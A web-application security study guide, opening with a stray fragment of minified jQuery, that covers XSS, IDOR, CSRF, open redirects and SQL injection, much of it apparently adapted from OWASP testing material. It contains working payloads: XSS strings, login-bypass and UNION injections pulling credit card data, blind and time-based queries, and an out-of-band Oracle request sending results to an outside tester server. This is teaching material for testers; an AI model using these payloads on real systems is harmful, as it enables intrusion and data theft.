c?(c=Fa(a,b),Ba.test(c)?n(a).position()[b]+"px":c):void 0})}),n.each({Height:"height",Width:"width"},function(a,b){n.each({padding:"inner"+a,content:b,"":"outer"+a},function(c,d){n.fn[d]=function(d,e){var f=arguments.length&&(c||"boolean"!=typeof d),g=c||(d===!0||e===!0?"margin":"border");return K(this,function(b,c,d){var e;return n.isWindow(b)?b.document.documentElement["client"+a]:9===b.nodeType?(e=b.documentElement,Math.max(b.body["scroll"+a],e["scroll"+a],b.body["offset"+a],e["offset"+a],e["client"+a])):void 0===d?n.css(b,c,g):n.style(b,c,d,g)},b,f?d:void 0,f,null)}})}),n.fn.extend({bind:function(a,b,c){return this.on(a,null,b,c)},unbind:function(a,b){return this.off(a,null,b)},delegate:function(a,b,c,d){return this.on(b,a,c,d)},undelegate:function(a,b,c){return 1===arguments.length?this.off(a,"**"):this.off(b,a||"**",c)},size:function(){return this.length}}),n.fn.andSelf=n.fn.addBack,"function"==typeof define&&define.amd&&define("jquery",[],function(){return n});var Nb=a.jQuery,Ob=a.$;return n.noConflict=function(b){return a.$===n&&(a.$=Ob),b&&a.jQuery===n&&(a.jQuery=Nb),n},b||(a.jQuery=a.$=n),n});
</script>

```
#
#  <a name="3.0"></a>3 XSS, Forced browsing and event listening

## <a name="3.1"></a>3.1  Event listening
* Clicks on the web page, this event listener will get triggered and will show an alert.
    ```html
    <html>
    <body>
    <button name="test_button" onclick="alert('clicked!')" ondblclick="alert('double clicked!')">Click me!</button>
    </body>
    </html>
    ```html
*  Iframe onload: Another very common event listener is ‘onload’, which simply gets triggered when some element (image, body, iframe, video etc. has finished loading.

    ```html
    <html>
    <body>
    <iframe src="https://ipchicken.com" onload="alert('lo')"></iframe>
    </body>
    </html>
    ```

* Image onerror: In this event listener, the src attribute in the img tag looks for the file given in the URL. But, if the url raises an error and cannot be accessed, we can have an onerror event listener to display an appropriate message to the user.
    ```html
        <html>
        <body>
        <p>

        Example of onerror event:
        </p>
        <img src="x" onerror="alert('No image found');">   
        </body>
        </html>
    ```
* Using getElementById method: Here, we ask the user to input her name using ```<input>``` tag. Then we access this input using the getElementById method, and add a “Hi”, to it. Then we display it on the alert box. This alert is displayed when the user clicks on the button after giving the input.

    ```html
    <html>
    <body>
    <input type="text" placeholder="Enter your name" id="textfield1">
    <button onclick="alert('Hi '+document.getElementById('textfield1').value)">Click Me</button>
    </body>
    </html>
    ```
## <a name="3.2"></a>3.2  XSS (Cross site scripting)
* Temporary XSS?
    * The vulnerabilities that allows hackers to insert malicious codes into the HTML code of the browser are called as temporary XSS or reflected xss. This attack is called temporary as the injected attack is not stored within the application, rather it infects only those users who have access to these links.

* Permanent XSS?
    * The vulnerabilities that allows hackers to inject and execute malicious client side scripts through the browser which gets permanently stored in the server are called as permanent XSS or stored XSS.

* HTML injection?
    * When a hacker is not able to execute JavaScript using XSS, but still able to cause potential harm using HTML. This particular vulnerability is called as HTML injection which occurs due to improper output validation as the website without any proper sanitation attaches the user input to its own HTML code.

* Temporary XSS example

    * Example 1
        *  As our input is simply appended into the `<h1>` tags, we can pass our own html in the user_name parameter and that HTML/JS will get appended to the output.

            * ```css 
              http://url/hello.php?user_name=<a>hacked</a>
                ```

            * ```css 
              http://url/hello.php?user_name=<iframe src=”hacker.com”></iframe>
              ```
            
            * ```css 
              http://url/hello.php?user_name=<script>alert(0);</script>
              ```

        * Example 2
            * Xss isnt always in a text field, it can directly be in the URL
                Exploitation doesn’t need `<script>` tags, js can be executed with js events too like onclick, onload, onmouseover etc
                ```html
                <img src="" onerror=alert(0)>
                ```
                ```html 
                <svg onload=alert(0)>
                ```

* Permanent XSS

    * Example 1 chatting domains
        * Comment
            ```js
            <script>
                alert("xssed")
            </script>
            ```

    * Example 2 with burp suite
        * User Agent: 
            ```jsx 
            <script>
                alert("xssed")
            </script>
            ``` 
    * Example 3 with input field
         ```html 
        <img src='x' onerror=alert(1)>
         ```
##  <a name="3.3"></a>3.3 Insecure Direct Object References (IDOR)

* IDOR can be prevented in many ways like making sensitive information accessible to authorized users, implementing proper authentication and authorization checks at every function to make sure the user requesting access to a resource whether to view or edit, is his/her data and no one else's. (config.php file, etc )
* Checking the different php files in url
* There are multiple cases in which a security expert can know about the existence of a link that is available after login:
    * As part of a White/Grey box exercise, he gets both all the user roles to test.
    * He guesses or brute forces (makes a script that tries all common page names).
    * He reads the source code and finds interesting links in the comments or in the code or even in other files like JS, CSS, etc. linked inside the source code.
    * He finds a user manual or other screenshots of the application (from search engines or on the website itself) and reads it to find a screenshot or a step telling the admin to visit a specific post login page.
    * He uses google dorks like site:x.com inurl:seller/actions and find a page indexed in google.
    * He finds sitemap files like sitemap.xml and robots.txt using google dork site:x.com sitemap robots.txt which contains list of links on the website.
    * He uses social engineering on a phone call to the seller support and asks them their present URL.

## <a name="3.4"></a>3.4  Session cookie flaws
* session cookies are created when logged in which is valid for a particular time. This is sent using POST based request

##  <a name="3.5"></a>3.5 CSRF Cross-site scripting request forgery

* You have access to the user browser and than send a request to do something suspicious. To check this vulnerability on website using burpsuite to check GET request without user interaction.

* CSRF is a flaw using which an attacker, after making a user visit hacker controlled website (let’s say x.com) sends a request to the vulnerable website from the user’s browser with the user’s cookies which authorises actions carried out on the website on the victim’s behalf. I.e the attacker can forge requests as to being sent by a victim from a “Cross Site” (different website) than the website to which the request is going and since there is no checking as to where the request is coming from, the forged request is accepted and actions are carried out on behalf of the user who visited the “Cross Site”.

    * Example 1
        ```html 
        <img src="http://url/cancel.php?all">
        ```
* Send link of this file to victim (same page logged in with victim user in different browser)

##  <a name="3.6"></a>3.6 Post based xss


* In this we intercept the request and make changes to the reqest being sent by the user.

##  <a name="3.7"></a>3.7 open redirection vulnerability

* In this vulnerability we check for the method being used to execute next page and than there we put the suspicious site address

* Example 2

    * Step 1: Go to the hacking challenge (The URL will be different for each user). 
    * Step 2: Open Burp Suite and turn the intercept on.
    * Step 3: Now click on the ‘track shipment’ button in the browser and intercept the request.
    * Step 4: Now go to Burp Suite and it will show you the intercepted request.
    * Step 5: Send this request to the repeater (ctrl+r) and turn off the intercept. Then move to the ‘repeater’ tab.
    You will see this parameter. /Open-Redirection/Variant-2/redirect.php?test=test.com/track/125625659
    * Step 6: Remove the dhl.com/track/125625659 part from the parameter and write google.com or any.com
    * Step 7: Then click on Go.
    * Step 8: Now right click under the ‘response’ section and select ‘show response in browser’ option from the list.
    * Step 9: Now copy and paste the response URL in the browser configured with Burp Suite.
    Here you will be redirected to Google.com or any other web page that you have used. 

* Example 3

    * Step 1: Go to the hacking challenge (The URL will be different for each user). 
    * Step 2: Now in the browser, click on the login button (make sure Burp Suite is connected to the browser and intercept is off).
    * Step 3: Click on the profile icon given on the top right hand corner, and click on logout.
    * Step 4: Now open Burp Suite and see what exactly happened when you clicked logout. You see a GET request is made to logout.php, click on it and you will see the HTTP request like this: 
        ```css
        GET /Open-Redirection/Variant-3/logout.php?to=http://google.com/Open-Redirection/Variant-3
        ```
    * Here it seems that whatever we enter after to=[HERE], the website redirects to that specific URL. Let’s check that. 
    * Step 5: Now send this request to the repeater(ctrl+r).
    * Step 6: Now in the ‘Repeater’ section, change the request as shown below:
        ```css 
        logout.php?to=http://google.com/Open-Redirection/Variant-3
        ```
    * Remove everything after `login.php?to=`
     and add any host like this - `logout.php?to=https://google.com/`
    You see that the response is not a redirection (302), instead it is 200 and it has an error saying:
    This URL doesn’t belong to `http://google.com/` as it is not written anywhere in it. Quit fooling around! (IP address will be different for each of you).
    This means that the website is checking if the to= actually contains a URL of this same website or not.
    * Step 7: We can easily bypass this by using the following payload:
         ```css
        logout.php?to=https://google.com/?http://http://google.com/Open-Redirection/Variant-3/
        ```
    (Replace IP with the IP you see in the error)
    When you put this in the repeater, you will see that the response is actually 302 (redirection) instead of 200 which means that you have bypassed the filter.
    * Step 8: In the request tab in the repeater, right click and click on ‘copy URL’. Now paste the URL in the browser. It should be something like this:
        ```css
        http://http://google.com/Open-Redirection/Variant-3/logout.php?to=https://google.com/?http://http://google.com/Open-Redirection/Variant-3/
        ```
    Opening this should redirect to Google hence completing the challenge. 
#
# <a name="4.0"></a>4 Database injection and vulnerability assessment 

* Mobile Application Security
* Firewall and Filter Bypass cheatsheet
* Secure Code Development Cheatsheets
* Web Application Security projects

* Follow top 10 `OWASP` (Open web application security project)

* Before we jump into the technicalities of the vulnerabilities listed in the OWASP Top 10 2013 list. Let’s quickly try to understand how these vulnerabilities work.

## <a name="4.1"></a>4.1 Vulnerability Explanation

* Injection
    * It allows hacker to inject server side codes or commands. These are the flaws that allows a hacker to inject his own codes/commands into the web server that can provide illegal access to the data.

* Broken Authentication and Session Management	
    * These flaws generally arise when application functions related to security and session management are not implemented properly, which allows hackers to bypass authentication mechanisms. For eg. Login

* Cross Site Scripting (XSS)	
    * This is one of the most common flaw in which hackers injects codes like HTML, JS directly into the web pages allowing them to deface websites and stealing data of the users who trust these websites.

* Insecure Direct Object References (IDOR)	
    * These are the flaws that may cause severe impact as with IDORs, the hackers get access to objects in the database that belong to other users, which allows them to steal or even edit critical data of other users on the website. They can either steal that information or even delete someone’s account.

* Security Misconfigurations	
    * These are again one of the most common flaws as the developers/administrators forget to securely seal an application before making it live. Common flaws under this vulnerability includes keeping default password, default pages etc.

* Sensitive Data Exposure	
    * These type of flaws occur when websites are unable to protect sensitive data like credit card information, passwords etc. which allows hackers to steal this information and may cause credit card fraud or identity theft.

* Missing Function-Level Access Controls	
    * These flaws occur when security implementation are not implemented properly in applications on both User interface and server i.e. front and back end respectively. This allows hackers to bypass security and gain restricted access.

* Cross Site Request Forgery	
    * This vulnerability allows a hacker to send forged requests on behalf of a trusted user, which allows the hacker to act on behalf of the user. For example, telling the bank server to transfer money from X to Y on the victim’s behalf and the bank server accepting it.

* Using Components with Known Vulnerabilities	
    * There are certain applications or their components that are known to exhibit vulnerabilities. If anyone is using these applications, it becomes easy for hackers to exploit these vulnerabilities and steal user data for eg. using an older version of windows server can be exploited by using an exploit code which is available online.

* Unvalidated Redirects and Forwards	
    * This flaw redirects users from a trusted website to a malicious website, which allows hackers to steal sensitive user information. For eg. if a user visits website A which he trusts but is redirected to website X which has a malware. But as user trusts A, he ends up trusting X.
* You can also check the list directly on the official OWASP website. Here’s the link: [OWASP-10](https://www.owasp.org/index.php/Top_10_2013-Top_10)

* What are injections?

    * Ans. These are the vulnerabilities through which attackers gains illegal access to the data. It allows attackers to directly insert their commands/codes into the web server.

* SQL?
    * SQL is abbreviated as Structured Query language which is used to query data from the database. It helps in communicating to database software to retrieve/store data from/in the databases.

* Database?
    * Databases is a part of database software in which all the application information like user information, messages, posts etc. are placed in a structured, easy to access and secured way. These databases contain tables.; tables contain columns and rows and each row has separate cells storing data against the specific column in a specific format.

* How is SQL used to communicate with database software?
    * SQL is a language which is used inside Server Side Programming Languages to communicate to database software in order to Save data in databases and retrieve it later.

* Types of commands used in MySQL?

    * Data Definition Language (DDL):- This command is used to define the structure of the data like how and where it would be stored. It is used in creating databases and tables, defining the structure of the tables and the columns. Examples include :- Create table, Alter table, Drop table.

    * Data Manipulation Language (DML):- These commands are used to manipulate already existing data inside  a table or insert new data (rows) inside a table. It helps to edit, delete, and create rows. Example Commands: Insert into <table>, update table (rows) and delete table (rows).

    * Data Query Language (DQL):- These commands are used to Query data from the database i.e. fetch required data from the database. It is used to fetch data from all the rows, fetch specific data, sort data and even calculate values inside the rows. Examples: Select `<columns>` from `<table>`, Order by `<column>`.

* An SQL injection attack consists of insertion or "injection" of either a partial or complete SQL query via the data input or transmitted from the client (browser) to the web application. A successful SQL injection attack can read sensitive data from the database, modify database data (insert/update/delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file existing on the DBMS file system or write files into the file system, and, in some cases, issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.


* In general the way web applications construct SQL statements involving SQL syntax written by the programmers is mixed with user-supplied data. Example:

    ```css
    select title, text from news where id=$id
    ```
* In the example above the variable $id contains user-supplied data, while the remainder is the SQL static part supplied by the programmer; making the SQL statement dynamic.

* Because the way it was constructed, the user can supply crafted input trying to make the original SQL statement execute further actions of the user's choice. The example below illustrates the user-supplied data “10 or 1=1”, changing the logic of the SQL statement, modifying the WHERE clause adding a condition “or 1=1”.

    ```css
    select title, text from news where id=10 or 1=1
    ```
* SQL Injection attacks can be divided into the following three classes:

* Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.
Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).

* Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.

A successful SQL Injection attack requires the attacker to craft a syntactically correct SQL Query. If the application returns an error message generated by an incorrect query, then it may be easier for an attacker to reconstruct the logic of the original query and, therefore, understand how to perform the injection correctly. However, if the application hides the error details, then the tester must be able to reverse engineer the logic of the original query.


About the techniques to exploit SQL injection flaws there are five commons techniques. Also those techniques sometimes can be used in a combined way (e.g. union operator and out-of-band):

* Union Operator: can be used when the SQL injection flaw happens in a SELECT statement, making it possible to combine two queries into a single result or result set.

* Boolean: use Boolean condition(s) to verify whether certain conditions are true or false.
Error based: this technique forces the database to generate an error, giving the attacker or tester information upon which to refine their injection.

* Out-of-band: technique used to retrieve data using a different channel (e.g., make a HTTP connection to send the results to a web server).

* Time delay: use database commands (e.g. sleep) to delay answers in conditional queries. It is useful when attacker doesn’t have some kind of answer (result, output, or error) from the application.

## <a name="4.2"></a>4.2  Testing

* Detection Techniques: 

* The first step in this test is to understand when the application interacts with a DB Server in order to access some data. Typical examples of cases when an application needs to talk to a DB include:

* Authentication forms: when authentication is performed using a web form, chances are that the user credentials are checked against a database that contains all usernames and passwords (or, better, password hashes).

* Search engines: the string submitted by the user could be used in a SQL query that extracts all relevant records from a database.

* E-Commerce sites: the products and their characteristics (price, description, availability, etc) are very likely to be stored in a database.

* The tester has to make a list of all input fields whose values could be used in crafting a SQL query, including the hidden fields of POST requests and then test them separately, trying to interfere with the query and to generate an error. Consider also HTTP headers and Cookies.


* The very first test usually consists of adding a single quote (') or a semicolon (;) to the field or parameter under test. The first is used in SQL as a string terminator and, if not filtered by the application, would lead to an incorrect query. The second is used to end a SQL statement and, if it is not filtered, it is also likely to generate an error. The output of a vulnerable field might resemble the following (on a 
Microsoft SQL Server, in this case):
    ```css 
    Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
    [Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the 
    character string ''.
    /target/target.asp, line 113
    ```
* Also comment delimiters (-- or /* */, etc) and other SQL keywords like 'AND' and 'OR' can be used to try to modify the query. A very simple but sometimes still effective technique is simply to insert a string where a number is expected, as an error like the following might be generated:

    ```css 
    Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
    [Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
    varchar value 'test' to a column of data type int.
    /target/target.asp, line 113
    ```

* Monitor all the responses from the web server and have a look at the HTML/javascript source code. Sometimes the error is present inside them but for some reason (e.g. javascript error, HTML comments, etc) is not presented to the user. A full error message, like those in the examples, provides a wealth of information to the tester in order to mount a successful injection attack. However, applications often do not provide so much detail: a simple '500 Server Error' or a custom error page might be issued, meaning that we need to use blind injection techniques. In any case, it is very important to test each field separately: only one variable must vary while all the other remain constant, in order to precisely understand which parameters are vulnerable and which are not.


##  <a name="4.3"></a>4.3 Standard SQL Injection Testing

* Example 1 (classical SQL Injection):

    * Consider the following SQL query:

    ```php
    SELECT * FROM Users WHERE Username='$username' AND Password='$password' 
    ```

* A similar query is generally used from the web application in order to authenticate a user. If the query returns a value it means that inside the database a user with that set of credentials exists, then the user is allowed to login to the system, otherwise access is denied. The values of the input fields are generally obtained from the user through a web form. Suppose we insert the following Username and Password values:

    ```php
    $username = 1' or '1' = '1
    $password = 1' or '1' = '1
    ```
* The query will be:
    ```php
    SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1' 
    ```
* If we suppose that the values of the parameters are sent to the server through the GET method, and if the domain of the vulnerable web site is www.example.com, the request that we'll carry out will be:

    ```css
    http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1 
    ```
* After a short analysis we notice that the query returns a value (or a set of values) because the condition is always true (OR 1=1). In this way the system has authenticated the user without knowing the username and password.
* In some systems the first row of a user table would be an administrator user. This may be the profile returned in some cases. Another example of query is the following:
    ```php
    SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password'))) 
    ```
* In this case, there are two problems, one due to the use of the parentheses and one due to the use of MD5 hash function. First of all, we resolve the problem of the parentheses. That simply consists of adding a number of closing parentheses until we obtain a corrected query. To resolve the second problem, we try to evade the second condition. We add to our query a final symbol that means that a comment is beginning. In this way, everything that follows such symbol is considered a comment. Every DBMS has its own syntax for comments, however, a common symbol to the greater majority of the databases is /*. In Oracle the symbol is "--". This said, the values that we'll use as Username and Password are:
    ```php
    $username = 1' or '1' = '1'))/*
    $password = foo
    ```
* In this way, we'll get the following query:
    ```php
    SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password'))) 
    ```
    * Due to the inclusion of a comment delimiter in the $username value the password portion of the query will be ignored.

    * The URL request will be:

    * ```css
      http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&password=foo 
        ```
* This may return a number of values. Sometimes, the authentication code verifies that the number of returned records/results is exactly equal to 1. In the previous examples, this situation would be difficult (in the database there is only one value per user). In order to go around this problem, it is enough to insert a SQL command that imposes a condition that the number of the returned results must be one. (One record returned) In order to reach this goal, we use the operator "LIMIT <num>", where <num> is the number of the results/records that we want to be returned. With respect to the previous example, the value of the fields Username and Password will be modified as follows:
    ```php
        $username = 1' or '1' = '1')) LIMIT 1/* 
        $password = foo 
    ```
* In this way, we create a request like the follow:
    ```css
    http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&password=foo 
    ```
* Example 2 (simple SELECT statement):

* Consider the following SQL query:
    ```css 
     SELECT * FROM products WHERE id_product=$id_product 
    ```

* Consider also the request to a script who executes the query above:
    ```css 
    http://www.example.com/product.php?id=10 
    ```

* When the tester tries a valid value (e.g. 10 in this case), the application will return the description of a product. A good way to test if the application is vulnerable in this scenario is play with logic, using the operators AND and OR.


* Consider the request:
    ```css
    http://www.example.com/product.php?id=10 AND 1=2
    ```
    ```css
    SELECT * FROM products WHERE id_product=10 AND 1=2
    ```
* In this case, probably the application would return some message telling us there is no content available or a blank page. Then the tester can send a true statement and check if there is a valid result:
    ```css 
    http://www.example.com/product.php?id=10 AND 1=1
    ```
* Example 3 (Stacked queries):

* Depending on the API which the web application is using and the DBMS (e.g. PHP + PostgreSQL, ASP+SQL SERVER) it may be possible to execute multiple queries in one call.


* Consider the following SQL query:
    ```css 
    SELECT * FROM products WHERE id_product=$id_product
    ```
* A way to exploit the above scenario would be:

    ```css
    http://www.example.com/product.php?id=10; INSERT INTO users (…)
    ```
This way is possible to execute many queries in a row and independent of the first query.


##  <a name="4.4"></a>4.4 Fingerprinting the Database

* Even though the SQL language is a standard, every DBMS has its peculiarity and differs from each other in many aspects like special commands, functions to retrieve data such as users names and databases, features, comments line etc.

* When the testers move to a more advanced SQL injection exploitation they need to know what the back end database is.

* The first way to find out what back end database is used is by observing the error returned by the application. The following are some examples of error messages:


* MySql:

* You have an error in your SQL syntax; check the manual
* that corresponds to your MySQL server version for the
* right syntax to use near '\'' at line 1
* One complete UNION SELECT with version() can also help to know the back end database.
    ```css
    SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1 
    ```
* Oracle:
    ```css
    ORA-00933: SQL command not properly ended
    ```
* MS SQL Server:
    ```css
    Microsoft SQL Native Client error ‘80040e14’
    Unclosed quotation mark after the character string
    SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
    ```
* PostgreSQL:
    ```css
    Query failed: ERROR: syntax error at or near
    "’" at character 56 in /www/site/test.php on line 121.
    ```
* If there is no error message or a custom error message, the tester can try to inject into string fields using varying concatenation techniques:

    ```css
    MySql: ‘test’ + ‘ing’
    SQL Server: ‘test’ ‘ing’
    Oracle: ‘test’||’ing’
    PostgreSQL: ‘test’||’ing’
    ```
## Exploitation Techniques

* Union Exploitation Technique
    * The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query. The result of the forged query will be joined to the result of the original query, allowing the tester to obtain the values of columns of other tables. Suppose for our examples that the query executed from the server is the following:
        ```css
        SELECT Name, Phone, Address FROM Users WHERE Id=$id
        ```
    * We will set the following $id value:
        ```css
        $id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
        ```

    * We will have the following query:
        ```css
        SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable
        ```


    * Which will join the result of the original query with all the credit card numbers in the CreditCardTable table. The keyword ALL is necessary to get around queries that use the keyword DISTINCT. Moreover, we notice that beyond the credit card numbers, we have selected two other values. These two values are necessary because the two queries must have an equal number of parameters/columns in order to avoid a syntax error.

    * The first detail a tester needs to exploit the SQL injection vulnerability using such technique is to find the right numbers of columns in the SELECT statement.

    * In order to achieve this the tester can use ORDER BY clause followed by a number indicating the numeration of database’s column selected:
        ```css
        http://www.example.com/product.php?id=10 ORDER BY 10--
        ```
    * If the query executes with success the tester can assume, in this example, there are 10 or more columns in the SELECT statement. If the query fails then there must be fewer than 10 columns returned by the query. If there is an error message available, it would probably be:
        ```css
        Unknown column '10' in 'order clause'
        ```
    * After the tester finds out the numbers of columns, the next step is to find out the type of columns. Assuming there were 3 columns in the example above, the tester could try each column type, using the NULL value to help them:
        ```css
        http://www.example.com/product.php?id=10 UNION SELECT 1,null,null--
        ```
    * If the query fails, the tester will probably see a message like:

    * All cells in a column must have the same datatype
    * If the query executes with success, the first column can be an integer. Then the tester can move further and so on:
        ```css
        http://www.example.com/product.php?id=10 UNION SELECT 1,1,null--
        ```
    * After the successful information gathering, depending on the application, it may only show the tester the first result, because the application treats only the first line of the result set. In this case, it is possible to use a LIMIT clause or the tester can set an invalid value, making only the second query valid (supposing there is no entry in the database which ID is 99999):
        ```css
        http://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--
        ```
##  <a name="4.5"></a>4.5 Boolean Exploitation Technique

* The Boolean exploitation technique is very useful when the tester finds a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. For example, this behavior happens in cases where the programmer has created a custom error page that does not reveal anything on the structure of the query or on the database. (The page does not return a SQL error, it may just return a HTTP 500, 404, or redirect).

* By using inference methods, it is possible to avoid this obstacle and thus to succeed in recovering the values of some desired fields. This method consists of carrying out a series of boolean queries against the server, observing the answers and finally deducing the meaning of such answers. We consider, as always, the www.example.com domain and we suppose that it contains a parameter named id vulnerable to SQL injection. This means that carrying out the following request:
    ```css
    http://www.example.com/index.php?id=1'
    ```
* We will get one page with a custom message error which is due to a syntactic error in the query. We suppose that the query executed on the server is:

    ```css
    SELECT field1, field2, field3 FROM Users WHERE Id='$Id' 
    ```
* Which is exploitable through the methods seen previously. What we want to obtain is the values of the username field. The tests that we will execute will allow us to obtain the value of the username field, extracting such value character by character. This is possible through the use of some standard functions, present in practically every database. For our examples, we will use the following pseudo-functions:


* SUBSTRING (text, start, length): returns a substring starting from the position "start" of text and of length "length". If "start" is greater than the length of text, the function returns a null value.


* ASCII (char): it gives back ASCII value of the input character. A null value is returned if char is 0.


* LENGTH (text): it gives back the number of characters in the input text.


* Through such functions, we will execute our tests on the first character and, when we have discovered the value, we will pass to the second and so on, until we will have discovered the entire value. The tests will take advantage of the function SUBSTRING, in order to select only one character at a time (selecting a single character means to impose the length parameter to 1), and the function ASCII, in order to obtain the ASCII value, so that we can do numerical comparison. The results of the comparison will be done with all the values of the ASCII table, until the right value is found. As an example, we will use the following value for Id:

    ```css
    $Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1 
    ```
* That creates the following query (from now on, we will call it "inferential query"):
    ```css
    SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1' -->
    ```
* The previous example returns a result if and only if the first character of the field username is equal to the ASCII value 97. If we get a false value, then we increase the index of the ASCII table from 97 to 98 and we repeat the request. If instead we obtain a true value, we set to zero the index of the ASCII table and we analyze the next character, modifying the parameters of the SUBSTRING function. The problem is to understand in which way we can distinguish tests returning a true value from those that return false. To do this, we create a query that always returns false. This is possible by using the following value for Id:
    ```css 
    $Id=1' AND '1' = '2 
    ```
* Which will create the following query:
    ```css
    SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2' 
    ```
* The obtained response from the server (that is HTML code) will be the false value for our tests. This is enough to verify whether the value obtained from the execution of the inferential query is equal to the value obtained with the test executed before. Sometimes, this method does not work. If the server returns two different pages as a result of two identical consecutive web requests, we will not be able to discriminate the true value from the false value. In these particular cases, it is necessary to use particular filters that allow us to eliminate the code that changes between the two requests and to obtain a template. Later on, for every inferential request executed, we will extract the relative template from the response using the same function, and we will perform a control between the two templates in order to decide the result of the test.

* In the previous discussion, we haven't dealt with the problem of determining the termination condition for out tests, i.e., when we should end the inference procedure. A techniques to do this uses one characteristic of the SUBSTRING function and the LENGTH function. When the test compares the current character with the ASCII code 0 (i.e., the value null) and the test returns the value true, then either we are done with the inference procedure (we have scanned the whole string), or the value we have analyzed contains the null character.

* We will insert the following value for the field Id:
    ```css
    $Id=1' AND LENGTH(username)=N AND '1' = '1 
    ```
* Where N is the number of characters that we have analyzed up to now (not counting the null value). The query will be:
    ```css 
    SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'
    ``` 
* The query returns either true or false. If we obtain true, then we have completed the inference and, therefore, we know the value of the parameter. If we obtain false, this means that the null character is present in the value of the parameter, and we must continue to analyze the next parameter until we find another null value.

* The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability.

##  <a name="4.6"></a>4.6 Error based Exploitation technique

* An Error based exploitation technique is useful when the tester for some reason can’t exploit the SQL injection vulnerability using other technique such as UNION. The Error based technique consists in forcing the database to perform some operation in which the result will be an error. The point here is to try to extract some data from the database and show it in the error message. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).

* Consider the following SQL query:

    ```css
    SELECT * FROM products WHERE id_product=$id_product
    ```
* Consider also the request to a script who executes the query above:

    ```css
    http://www.example.com/product.php?id=10
    ```
* The malicious request would be (e.g. Oracle 10g):

    ```css
    http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--
    ```
* In this example, the tester is concatenating the value 10 with the result of the function UTL_INADDR.GET_HOST_NAME. This Oracle function will try to return the host name of the parameter passed to it, which is other query, the name of the user. When the database looks for a host name with the user database name, it will fail and return an error message like:
    ```css 
    ORA-292257: host SCOTT unknown
    ```
Then the tester can manipulate the parameter passed to GET_HOST_NAME() function and the result will be shown in the error message.

##  <a name="4.7"></a>4.7 Out of band Exploitation technique

* This technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. The technique consists of the use of DBMS functions to perform an out of band connection and deliver the results of the injected query as part of the request to the tester’s server. Like the error based techniques, each DBMS has its own functions. Check for specific DBMS section.


* Consider the following SQL query:
    ```css
    SELECT * FROM products WHERE id_product=$id_product
    ```
* Consider also the request to a script who executes the query above:

    ```css
    http://www.example.com/product.php?id=10
    ```
* The malicious request would be:
    ```css
    http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--
    ```
* In this example, the tester is concatenating the value 10 with the result of the function UTL_HTTP.request. This Oracle function will try to connect to ‘testerserver’ and make a HTTP GET request containing the return from the query “SELECT user FROM DUAL”. The tester can set up a webserver (e.g. Apache) or use the Netcat tool:
    ```css
    /home/tester/nc –nLp 80
    GET /SCOTT HTTP/1.1
    Host: testerserver.com
    Connection: close
    ```
##  <a name="4.8"></a>4.8 Time delay Exploitation technique

* The time delay exploitation technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation. This technique consists in sending an injected query and in case the conditional is true, the tester can monitor the time taken to for the server to respond. If there is a delay, the tester can assume the result of the conditional query is true. This exploitation technique can be different from DBMS to DBMS (check DBMS specific section).


* Consider the following SQL query:
    ```css 
    SELECT * FROM products WHERE id_product=$id_product 
    ```
* Consider also the request to a script who executes the query above:
    ```css
    http://www.example.com/product.php?id=10
    ```
* The malicious request would be (e.g. MySql 5.x):

    ```css
    http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--
    ```
* In this example the tester is checking whether the MySql version is 5.x or not, making the server to delay the answer by 10 seconds. The tester can increase the delay time and monitor the responses. The tester also doesn’t need to wait for the response. Sometimes he can set a very high value (e.g. 100) and cancel the request after some seconds.

##  <a name="4.9"></a>4.9 Stored Procedure Injection

* When using dynamic SQL within a stored procedure, the application must properly sanitize the user input to eliminate the risk of code injection. If not sanitized, the user could enter malicious SQL that will be executed within the stored procedure.

* Consider the following SQL Server Stored Procedure:
    ```css
    Create procedure user_login @username varchar(20), @passwd varchar(20) 
    As
    Declare @sqlstring varchar(250)
    Set @sqlstring  = ‘
    Select 1 from users
    Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
    exec(@sqlstring)
    Go 
    ```

* User input:
    ```css
    anyusername or 1=1'
    anypassword
    This procedure does not sanitize the input, therefore allowing the return value to show an existing record with these parameters. 
    ```

